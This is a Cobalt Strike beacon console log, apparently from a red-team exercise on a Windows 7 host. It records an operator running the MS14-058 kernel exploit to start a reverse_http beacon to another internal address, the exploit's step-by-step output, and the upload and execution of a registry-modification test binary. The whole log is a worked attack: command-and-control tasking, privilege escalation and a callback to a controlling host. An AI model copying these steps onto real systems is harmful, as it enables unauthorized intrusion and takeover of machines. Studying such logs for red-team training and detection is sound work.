02/26 14:10:35 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 13636; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/26 14:11:37 [input] <neo> elevate ms14-058 test
02/26 14:11:37 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/26 14:12:31 [checkin] host called home, sent: 104503 bytes
02/26 14:12:32 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43816
[*] Parsing SYSTEM_INFO...
[*] 148 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c02000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F551FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F589D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C2B00010
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/26 15:35:21 [task] 4*******请先提权*******
02/26 16:27:00 [task] Tasked beacon to make directory c:\RedTeam\
02/26 16:27:00 [task] cd c:\RedTeam\
02/26 16:27:00 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1112.exe as T1112.exe
02/26 16:27:00 [indicator] file: 07c5c097bd5cffd297043bee15dab5cf 7680 bytes T1112.exe
02/26 16:27:00 [task] 修改
02/26 16:27:00 [task] Tasked beacon to run: c:\RedTeam\T1112.exe
02/26 16:27:35 [checkin] host called home, sent: 7790 bytes
